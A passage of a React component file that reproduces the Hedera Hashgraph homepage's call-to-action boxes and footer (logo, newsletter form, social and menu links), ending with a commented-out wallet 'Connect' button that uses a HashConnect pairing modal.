            src="https://images.hedera.com/HH-Homepage-Desktop-CTA-3.jpg?w=974&h=612&auto=compress%2Cformat&fit=crop&dm=1709007456&s=1d3735cd7cee31374b5758958227ee5f"
          />

          <img
            className="bgImage bgImageMobile"
            src="https://images.hedera.com/HH-Homepage-Mobile-CTA-3.jpg?w=375&amp;h=383&amp;auto=compress%2Cformat&amp;fit=crop&amp;dm=1709007494&amp;s=4e283c96e695ce5abe58c9b0dede05af"
          />

          <div className="box-body">
            <div className="box-text">
              <h3 className="box-heading">RETAIL USERS</h3>

              <div className="box-description">
                Start using permissionless dapps built on Hedera, from DeFi protocols to NFT marketplaces and more.
              </div>
            </div>

            <a
              // dataSavepageHref="/ecosystem"
              href="https://hedera.com/ecosystem"
              className="Btn is-white has-bg"
              target="_blank"
              rel="noreferrer noopener"
            >Start using</a>
          </div>
        </div>

        <div className="box">
          <img
            className="bgImage bgImageHasMobile"
            src="https://images.hedera.com/HH-Homepage-Desktop-CTA-2.jpg?w=974&h=612&auto=compress%2Cformat&fit=crop&dm=1709007454&s=e71a0632a177042d91c2f8d597a5f7db"
          />

          <img
            className="bgImage bgImageMobile"
            src="https://images.hedera.com/HH-Homepage-Mobile-CTA-2.jpg?w=375&amp;h=383&amp;auto=compress%2Cformat&amp;fit=crop&amp;dm=1709007487&amp;s=e6a4c14e9ab2cd28f8b5152ad48d859e"
          />

          <div className="box-body">
            <div className="box-text">
              <h3 className="box-heading">HBAR ENTHUSIASTS</h3>

              <div className="box-description">
                Learn more about HBAR, Hedera, and use cases. Join the community, get a wallet, and view exchanges.
              </div>
            </div>

            <a
              // dataSavepageHref="/hbar"
              href="https://hedera.com/hbar"
              className="Btn is-white has-bg"
              target="_blank"
              rel="noreferrer noopener"
            >Start learning</a>
          </div>
        </div>
      </div>
    </div>
  </div>

  <div
    className="footer"
    id="footer"
  >
    <div className="footer-top">
      <div className="footer-logo">
        <a
          // dataSavepageHref="/"
          href="https://hedera.com/"
          className="footer-logo-link"
        >
          <svg
            xmlns="http://www.w3.org/2000/svg"
            viewBox="0 0 448.29 138.93"
          >
            <defs>
              style
            </defs>

            <g
              id="Layer_2"
              data-name="Layer 2"
            >
              <g
                id="Layer_2-2"
                data-name="Layer 2"
              >
                <rect
                  className="cls-1"
                  x="52.08"
                  y="64.51"
                  width="35.53"
                  height="8.85"
                ></rect>

                <path
                  className="cls-1"
                  d="M69.46,0a69.47,69.47,0,1,0,69.47,69.47A69.46,69.46,0,0,0,69.46,0ZM95.29,96.94H87.23V79.79H51.7V96.94H43.63V41.32H51.7V58.08H87.23V41.32h8.06Z"
                ></path>

                <polygon
                  className="cls-1"
                  points="208.06 66.09 177.14 66.09 177.14 43.77 169.31 43.77 169.31 96.18 177.14 96.18 177.14 73.42 208.06 73.42 208.06 96.18 215.89 96.18 215.89 43.77 208.06 43.77 208.06 66.09"
                ></polygon>

                <path
                  className="cls-1"
                  d="M243,65.06c5.13,0,8.73,2.64,10.44,7.65h-21c1.48-4.87,5.32-7.65,10.6-7.65m0-6.46c-10.62,0-18.64,8.27-18.64,19.22a18.85,18.85,0,0,0,19.3,19.23c12.64,0,17.06-8.48,17.62-11.45l.08-.46h-7.26l-.11.22c-.09.19-2.48,4.8-10.33,4.8-6.46,0-11.26-4.56-11.8-11.14H261.7v-.4c0-11.79-7.7-20-18.72-20"
                ></path>

                <path
                  className="cls-1"
                  d="M286.82,90.16c-6.91,0-11.74-5.08-11.74-12.33s4.83-12.34,11.74-12.34,11.61,5.07,11.61,12.34-4.77,12.33-11.61,12.33m11.46-25.73c-1.81-2.5-5.94-5.83-12.69-5.83-10.68,0-18.13,7.91-18.13,19.23s7.45,19.22,18.13,19.22a15.26,15.26,0,0,0,12.69-6.12v5.25h7.4V41.88h-7.4Z"
                ></path>

                <path
                  className="cls-1"
                  d="M333.07,65.06c5.12,0,8.73,2.64,10.43,7.65h-21c1.48-4.87,5.32-7.65,10.61-7.65m0-6.46c-10.63,0-18.65,8.27-18.65,19.22a18.85,18.85,0,0,0,19.3,19.23c12.64,0,17.06-8.48,17.62-11.45l.08-.46h-7.26l-.1.22c-.1.19-2.5,4.8-10.34,4.8-6.46,0-11.25-4.56-11.79-11.14h29.85v-.4c0-11.79-7.7-20-18.71-20"
                ></path>

                <path
                  className="cls-1"
                  d="M367.56,64.81V59.47h-7.41v36.7h7.41V75.5c0-6.42,3.35-8.92,12-8.92h9.56v-7.4h-9.41c-7.33,0-10.66,3.25-12.11,5.63"
                ></path>

                <path
                  className="cls-1"
                  d="M422,77.82c0,7.15-4.73,12.34-11.24,12.34-6.79,0-11.53-5.07-11.53-12.34S404,65.49,410.79,65.49c6.51,0,11.24,5.19,11.24,12.33m-.15-13.37c-1.45-2-5.14-5.85-12.33-5.85-8.9,0-17.91,6.6-17.91,19.22,0,11.32,7.36,19.23,17.91,19.23A14.44,14.44,0,0,0,421.88,91v5.21h7.4V59.47h-7.4Z"
                ></path>

                <polygon
                  className="cls-1"
                  points="436.45 60.56 438.48 60.56 438.48 65.15 439.24 65.15 439.24 60.56 441.27 60.56 441.27 59.86 436.45 59.86 436.45 60.56"
                ></polygon>

                <polygon
                  className="cls-1"
                  points="447.12 59.86 445.37 64.04 443.62 59.86 442.43 59.86 442.43 65.15 443.15 65.15 443.15 60.56 445.09 65.18 445.61 65.18 447.53 60.6 447.53 65.15 448.29 65.15 448.29 59.86 447.12 59.86"
                ></polygon>
              </g>
            </g>
          </svg>
        </a>
      </div>

      <div className="footer-form">
        <div className="footer-form-heading">Sign up for the newsletter</div>

        <div>
          <form
            method="post"
            className="NewsletterSignupFooter"
            id="Newsletter-20830880"
            data-hs-cf-bound="true"
          >
            <div className="contents">
              <input
                type="email"
                className="input"
                name="fields[email]"
                placeholder="Enter email address"
                // maxlength="48"
                id="email"
                // value=""
              ></input>

              <button
                type="submit"
                className="Btn is-white has-bg"
              >Sign Up Now</button>
            </div>
          </form>
        </div>
      </div>

      <div className="footer-social">
        <div className="footer-social-heading">CONNECT WITH US</div>

        <div className="footer-social-links">
          <a
            href="https://hedera.com/discord"
            target="_blank"
            rel="noreferrer noopener"
          >
            <svg
              // ariaLabelledby="simpleicons-discord-icon"
              role="img"
              viewBox="0 0 24 24"
              xmlns="http://www.w3.org/2000/svg"
            >
              <title id="simpleicons-discord-icon">Discord</title>

              <path d="M20.222 0c1.406 0 2.54 1.137 2.607 2.475V24l-2.677-2.273-1.47-1.338-1.604-1.398.67 2.205H3.71c-1.402 0-2.54-1.065-2.54-2.476V2.48C1.17 1.142 2.31.003 3.715.003h16.5L20.222 0zm-6.118 5.683h-.03l-.202.2c2.073.6 3.076 1.537 3.076 1.537-1.336-.668-2.54-1.002-3.744-1.137-.87-.135-1.74-.064-2.475 0h-.2c-.47 0-1.47.2-2.81.735-.467.203-.735.336-.735.336s1.002-1.002 3.21-1.537l-.135-.135s-1.672-.064-3.477 1.27c0 0-1.805 3.144-1.805 7.02 0 0 1 1.74 3.743 1.806 0 0 .4-.533.805-1.002-1.54-.468-2.14-1.404-2.14-1.404s.134.066.335.2h.06c.03 0 .044.015.06.03v.006c.016.016.03.03.06.03.33.136.66.27.93.4.466.202 1.065.403 1.8.536.93.135 1.996.2 3.21 0 .6-.135 1.2-.267 1.8-.535.39-.2.87-.4 1.397-.737 0 0-.6.936-2.205 1.404.33.466.795 1 .795 1 2.744-.06 3.81-1.8 3.87-1.726 0-3.87-1.815-7.02-1.815-7.02-1.635-1.214-3.165-1.26-3.435-1.26l.056-.02zm.168 4.413c.703 0 1.27.6 1.27 1.335 0 .74-.57 1.34-1.27 1.34-.7 0-1.27-.6-1.27-1.334.002-.74.573-1.338 1.27-1.338zm-4.543 0c.7 0 1.266.6 1.266 1.335 0 .74-.57 1.34-1.27 1.34-.7 0-1.27-.6-1.27-1.334 0-.74.57-1.338 1.27-1.338z"></path>
            </svg>
          </a>

          <a
            href="https://www.facebook.com/hederanetwork"
            target="_blank"
            rel="noreferrer noopener"
          >
            <svg
              // ariaLabelledby="simpleicons-facebook-icon"
              role="img"
              viewBox="0 0 24 24"
              xmlns="http://www.w3.org/2000/svg"
            >
              <title id="simpleicons-facebook-icon">Facebook</title>

              <path d="M22.676 0H1.324C.593 0 0 .593 0 1.324v21.352C0 23.408.593 24 1.324 24h11.494v-9.294H9.689v-3.621h3.129V8.41c0-3.099 1.894-4.785 4.659-4.785 1.325 0 2.464.097 2.796.141v3.24h-1.921c-1.5 0-1.792.721-1.792 1.771v2.311h3.584l-.465 3.63H16.56V24h6.115c.733 0 1.325-.592 1.325-1.324V1.324C24 .593 23.408 0 22.676 0"></path>
            </svg>
          </a>

          <a
            href="https://www.linkedin.com/company/hashgraph"
            target="_blank"
            rel="noreferrer noopener"
          >
            <svg
              // ariaLabelledby="simpleicons-linkedin-icon"
              role="img"
              viewBox="0 0 24 24"
              xmlns="http://www.w3.org/2000/svg"
            >
              <title id="simpleicons-linkedin-icon">LinkedIn</title>

              <path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433c-1.144 0-2.063-.926-2.063-2.065 0-1.138.92-2.063 2.063-2.063 1.14 0 2.064.925 2.064 2.063 0 1.139-.925 2.065-2.064 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"></path>
            </svg>
          </a>

          <a
            href="https://medium.com/hashgraph"
            target="_blank"
            rel="noreferrer noopener"
          >
            <svg
              // ariaLabelledby="simpleicons-medium-icon"
              role="img"
              viewBox="0 0 24 24"
              xmlns="http://www.w3.org/2000/svg"
            >
              <title id="simpleicons-medium-icon">Medium</title>

              <path d="M2.846 6.36c.03-.295-.083-.586-.303-.784l-2.24-2.7v-.403H7.26l5.378 11.795 4.728-11.795H24v.403l-1.917 1.837c-.165.126-.247.333-.213.538v13.5c-.034.204.048.41.213.537l1.87 1.837v.403h-9.41v-.403l1.937-1.882c.19-.19.19-.246.19-.538V7.794l-5.39 13.688h-.727L4.278 7.794v9.174c-.052.386.076.774.347 1.053l2.52 3.06v.402H0v-.403l2.52-3.06c.27-.278.39-.67.326-1.052V6.36z"></path>
            </svg>
          </a>

          <a
            href="https://www.reddit.com/r/Hedera/"
            target="_blank"
            rel="noreferrer noopener"
          >
            <svg
              // ariaLabelledby="simpleicons-reddit-icon"
              role="img"
              viewBox="0 0 24 24"
              xmlns="http://www.w3.org/2000/svg"
            >
              <title id="simpleicons-reddit-icon">Reddit</title>

              <path d="M2.204 14.049c-.06.276-.091.56-.091.847 0 3.443 4.402 6.249 9.814 6.249 5.41 0 9.812-2.804 9.812-6.249 0-.274-.029-.546-.082-.809l-.015-.032c-.021-.055-.029-.11-.029-.165-.302-1.175-1.117-2.241-2.296-3.103-.045-.016-.088-.039-.126-.07-.026-.02-.045-.042-.067-.064-1.792-1.234-4.356-2.008-7.196-2.008-2.815 0-5.354.759-7.146 1.971-.014.018-.029.033-.049.049-.039.033-.084.06-.13.075-1.206.862-2.042 1.937-2.354 3.123 0 .058-.014.114-.037.171l-.008.015zm9.773 5.441c-1.794 0-3.057-.389-3.863-1.197-.173-.174-.173-.457 0-.632.176-.165.46-.165.635 0 .63.629 1.685.943 3.228.943 1.542 0 2.591-.3 3.219-.929.165-.164.45-.164.629 0 .165.18.165.465 0 .645-.809.808-2.065 1.198-3.862 1.198l.014-.028zm-3.606-7.573c-.914 0-1.677.765-1.677 1.677 0 .91.763 1.65 1.677 1.65s1.651-.74 1.651-1.65c0-.912-.739-1.677-1.651-1.677zm7.233 0c-.914 0-1.678.765-1.678 1.677 0 .91.764 1.65 1.678 1.65s1.651-.74 1.651-1.65c0-.912-.739-1.677-1.651-1.677zm4.548-1.595c1.037.833 1.8 1.821 2.189 2.904.45-.336.719-.864.719-1.449 0-1.002-.815-1.816-1.818-1.816-.399 0-.778.129-1.09.363v-.002zM2.711 9.963c-1.003 0-1.817.816-1.817 1.818 0 .543.239 1.048.644 1.389.401-1.079 1.172-2.053 2.213-2.876-.302-.21-.663-.329-1.039-.329v-.002zm9.217 12.079c-5.906 0-10.709-3.205-10.709-7.142 0-.275.023-.544.068-.809C.494 13.598 0 12.729 0 11.777c0-1.496 1.227-2.713 2.725-2.713.674 0 1.303.246 1.797.682 1.856-1.191 4.357-1.941 7.112-1.992l1.812-5.524.404.095s.016 0 .016.002l4.223.993c.344-.798 1.138-1.36 2.065-1.36 1.229 0 2.231 1.004 2.231 2.234 0 1.232-1.003 2.234-2.231 2.234s-2.23-1.004-2.23-2.23l-3.851-.912-1.467 4.477c2.65.105 5.047.854 6.844 2.021.494-.464 1.144-.719 1.833-.719 1.498 0 2.718 1.213 2.718 2.711 0 .987-.54 1.886-1.378 2.365.029.255.059.494.059.749-.015 3.938-4.806 7.143-10.72 7.143l-.034.009zm8.179-19.187c-.74 0-1.34.599-1.34 1.338 0 .738.6 1.34 1.34 1.34.732 0 1.33-.6 1.33-1.334 0-.733-.598-1.332-1.347-1.332l.017-.012z"></path>
            </svg>
          </a>

          <a
            href="https://stackoverflow.com/questions/tagged/hedera-hashgraph"
            target="_blank"
            rel="noreferrer noopener"
          >
            <svg
              // ariaLabelledby="simpleicons-stackoverflow-icon"
              role="img"
              xmlns="http://www.w3.org/2000/svg"
              viewBox="0 0 24 24"
            >
              <title id="simpleicons-stackoverflow-icon">Stack Overflow</title>

              <path d="m15.725 0l-1.72 1.277l6.39 8.588l1.716-1.277L15.725 0zm-3.94 3.418l-1.369 1.644l8.225 6.85l1.369-1.644l-8.225-6.85zm-3.15 4.465l-.905 1.94l9.702 4.517l.904-1.94l-9.701-4.517zm-1.85 4.86l-.44 2.093l10.473 2.201l.44-2.092l-10.473-2.203zM1.89 15.47V24h19.19v-8.53h-2.133v6.397H4.021v-6.396H1.89zm4.265 2.133v2.13h10.66v-2.13H6.154Z"></path>
            </svg>
          </a>

          <a
            href="https://t.me/hederahashgraph"
            target="_blank"
            rel="noreferrer noopener"
          >
            <svg
              // ariaLabelledby="simpleicons-telegram-icon"
              role="img"
              xmlns="http://www.w3.org/2000/svg"
              viewBox="0 0 24 24"
            >
              <title id="simpleicons-telegram-icon">Telegram</title>

              <path d="M9.028 20.837c-.714 0-.593-.271-.839-.949l-2.103-6.92L22.263 3.37"></path>
              <path d="M9.028 20.837c.552 0 .795-.252 1.105-.553l2.941-2.857-3.671-2.214"></path>
              <path d="M9.403 15.213l8.89 6.568c1.015.56 1.748.271 2-.942l3.62-17.053c.372-1.487-.564-2.159-1.534-1.72L1.125 10.263c-1.45.582-1.443 1.392-.264 1.753l5.455 1.7L18.94 5.753c.595-.36 1.143-.167.694.232"></path>
            </svg>
          </a>

          <a
            href="https://twitter.com/hedera"
            target="_blank"
            rel="noreferrer noopener"
          >
            <svg
              // ariaLabelledby="simpleicons-twitter-icon"
              role="img"
              viewBox="0 0 24 24"
              xmlns="http://www.w3.org/2000/svg"
            >
              <title>X</title>

              <path d="M18.901 1.153h3.68l-8.04 9.19L24 22.846h-7.406l-5.8-7.584-6.638 7.584H.474l8.6-9.83L0 1.154h7.594l5.243 6.932ZM17.61 20.644h2.039L6.486 3.24H4.298Z"></path>
            </svg>
          </a>

          <a
            href="https://www.youtube.com/hederahashgraph"
            target="_blank"
            rel="noreferrer noopener"
          >
            <svg
              // ariaLabelledby="simpleicons-youtube-icon"
              role="img"
              xmlns="http://www.w3.org/2000/svg"
              viewBox="0 0 24 24"
            >
              <title id="simpleicons-youtube-icon">YouTube</title>

              <path d="M23.495 6.205a3.007 3.007 0 0 0-2.088-2.088c-1.87-.501-9.396-.501-9.396-.501s-7.507-.01-9.396.501A3.007 3.007 0 0 0 .527 6.205a31.247 31.247 0 0 0-.522 5.805 31.247 31.247 0 0 0 .522 5.783 3.007 3.007 0 0 0 2.088 2.088c1.868.502 9.396.502 9.396.502s7.506 0 9.396-.502a3.007 3.007 0 0 0 2.088-2.088 31.247 31.247 0 0 0 .5-5.783 31.247 31.247 0 0 0-.5-5.805zM9.609 15.601V8.408l6.264 3.602z"></path>
            </svg>
          </a>
        </div>
      </div>
    </div>

    <div className="footer-middle">
      <ul className="footer-menu">
        <li className="footer-menu-section-title">
          <a
            // dataSavepageHref="/audits-and-standards"
            href="https://hedera.com/audits-and-standards"
          >Transparency</a>
        </li>

        <li className="footer-menu-item">
          <a
            // dataSavepageHref="/open-source"
            href="https://hedera.com/open-source"
          >Open Source</a>
        </li>

        <li className="footer-menu-item">
          <a
            // dataSavepageHref="/audits-and-standards"
            href="https://hedera.com/audits-and-standards"
          >Audits &amp; Standards</a>
        </li>

        <li className="footer-menu-item">
          <a
            // dataSavepageHref="/ucl-blockchain-energy"
            href="https://hedera.com/ucl-blockchain-energy"
          >Sustainability Commitment</a>
        </li>

        <li className="footer-menu-item">
          <a
            // dataSavepageHref="/carbon-offsets"
            href="https://hedera.com/carbon-offsets"
          >Carbon Offsets</a>
        </li>
      </ul>

      <ul className="footer-menu">
        <li className="footer-menu-section-title">
          <a
            // dataSavepageHref="/council"
            href="https://hedera.com/council"
          >Governance</a>
        </li>

        <li className="footer-menu-item">
          <a
            // dataSavepageHref="/council"
            href="https://hedera.com/council"
          >Hedera Council</a>
        </li>

        <li className="footer-menu-item">
          <a
            // dataSavepageHref="/public-policy"
            href="https://hedera.com/public-policy"
          >Public Policy</a>
        </li>

        <li className="footer-menu-item">
          <a
            // dataSavepageHref="/treasury-management-report"
            href="https://hedera.com/treasury-management-report"
          >Treasury Management</a>
        </li>

        <li className="footer-menu-item">
          <a
            // dataSavepageHref="/council/minutes"
            href="https://hedera.com/council/minutes"
          >Meeting Minutes</a>
        </li>

        <li className="footer-menu-item">
          <a
            // dataSavepageHref="/hh_llc-agreement"
            href="https://hedera.com/hh_llc-agreement"
            target="_blank"
            rel="noreferrer noopener"
          >LLC Agreement</a>
        </li>

        <li className="footer-menu-item">
          <a
            href="https://docs.hedera.com/hedera/networks/mainnet/mainnet-nodes/node-requirements"
            target="_blank"
            rel="noreferrer noopener"
          >Node Requirements</a>
        </li>
      </ul>

      <ul className="footer-menu">
        <li className="footer-menu-section-title">
          <a
            // dataSavepageHref="/events"
            href="https://hedera.com/events"
          >Community</a>
        </li>

        <li className="footer-menu-item">
          <a
            // dataSavepageHref="/events"
            href="https://hedera.com/events"
          >Events</a>
        </li>

        <li className="footer-menu-item">
          <a
            href="https://docs.hedera.com/hedera/support-and-community/meetups"
            target="_blank"
            rel="noreferrer noopener"
          >Meetups</a>
        </li>

        <li className="footer-menu-item">
          <a
            href="https://t.me/hederahashgraph"
            target="_blank"
            rel="noreferrer noopener"
          >HBAR Telegram</a>
        </li>

        <li className="footer-menu-item">
          <a
            href="https://hedera.com/discord"
            target="_blank"
            rel="noreferrer noopener"
          >Developer Discord</a>
        </li>

        <li className="footer-menu-item">
          <a
            href="https://twitter.com/search?q=%23hedera&amp;f=live"
            target="_blank"
            rel="noreferrer noopener"
          >Twitter Community</a>
        </li>
      </ul>

      <ul className="footer-menu">
        <li className="footer-menu-section-title">
          <a href="http://help.hedera.com/">Support</a>
        </li>

        <li className="footer-menu-item">
          <a
            href="http://help.hedera.com/"
            target="_blank"
            rel="noreferrer noopener"
          >FAQ</a>
        </li>

        <li className="footer-menu-item">
          <a
            href="http://status.hedera.com/"
            target="_blank"
            rel="noreferrer noopener"
          >Network Status</a>
        </li>

        <li className="footer-menu-item">
          <a
            href="https://hedera.com/discord"
            target="_blank"
            rel="noreferrer noopener"
          >Developer Discord</a>
        </li>

        <li className="footer-menu-item">
          <a
            href="https://stackoverflow.com/questions/tagged/hedera-hashgraph"
            target="_blank"
            rel="noreferrer noopener"
          >StackOverflow</a>
        </li>
      </ul>

      <ul className="footer-menu">
        <li className="footer-menu-section-title">
          <a href="https://brand.hedera.com/">Brand</a>
        </li>

        <li className="footer-menu-item">
          <a
            href="https://brand.hedera.com/"
            target="_blank"
            rel="noreferrer noopener"
          >Brand Guidelines</a>
        </li>

        <li className="footer-menu-item">
          <a
            href="https://brand.hedera.com/d/8cqcsbmscMny/brand-guidelines#/basics/built-on-hedera"
            target="_blank"
            rel="noreferrer noopener"
          >Built on Hedera Logo</a>
        </li>

        <li className="footer-menu-item">
          <a
            href="https://shop.hedera.com/"
            target="_blank"
            rel="noreferrer noopener"
          >Hedera Store</a>
        </li>
      </ul>

      <ul className="footer-menu">
        <li className="footer-menu-section-title">
          <a
            // dataSavepageHref="/about"
            href="https://hedera.com/about"
          >About</a>
        </li>

        <li className="footer-menu-item">
          <a
            // dataSavepageHref="/about"
            href="https://hedera.com/about"
          >Team</a>
        </li>

        <li className="footer-menu-item">
          <a
            // dataSavepageHref="/partners"
            href="https://hedera.com/partners"
          >Partners</a>
        </li>

        <li className="footer-menu-item">
          <a
            // dataSavepageHref="/journey"
            href="https://hedera.com/journey"
          >Journey</a>
        </li>

        <li className="footer-menu-item">
          <a
            // dataSavepageHref="/roadmap"
            href="https://hedera.com/roadmap"
          >Roadmap</a>
        </li>

        <li className="footer-menu-item">
          <a
            // dataSavepageHref="/work"
            href="https://hedera.com/work"
          >Careers</a>
        </li>
      </ul>

      <ul className="footer-menu is-last">
        <li className="footer-menu-section-title">
          <a href="https://share.hsforms.com/1qD7NTaCNRfSu3p11Ajh25wceh7k">Contact</a>
        </li>

        <li className="footer-menu-item">
          <a
            href="https://share.hsforms.com/1qD7NTaCNRfSu3p11Ajh25wceh7k"
            target="_blank"
            rel="noreferrer noopener"
          >General Inquiry</a>
        </li>

        <li className="footer-menu-item">
          <a href="mailto:pr@hedera.com">Public Relations</a>
        </li>
      </ul>
    </div>

    <div className="footer-bottom">
      <p className="footer-legal">
        © 2018-2024 Hedera Hashgraph, LLC. All trademarks and company names are the property of their respective owners. All rights in the Deutsche Telekom mark are protected by Deutsche Telekom AG. All rights reserved. Hedera uses the third party marks with permission.

        <br />

        <a
          // dataSavepageHref="/terms"
          href="https://hedera.com/terms"
        >Terms of Use</a>

        |

        <a
          // dataSavepageHref="/privacy"
          href="https://hedera.com/privacy"
        >Privacy Policy</a>
      </p>
    </div>
  </div>

    </>
    // <Box>
    //   <Button
    //     color={"blurple" as any}
    //     variant="contained"
    //     onClick={async () => {
    //       if (isConnected) {
    //         await hcInitPromise;
    //         if (isConnected && hc.connectedAccountIds.length > 0) {
    //           hc.disconnect();
    //         }
    //       } else {
    //         hc.openPairingModal();
    //       }
    //     }}
    //   >
    //     {isConnected
    //       ? `Disconnect Account${connectedAccountIds.length > 1 ? "s" : ""}`
    //       : "Connect"}
    //   </Button>
    // </Box>
  );
};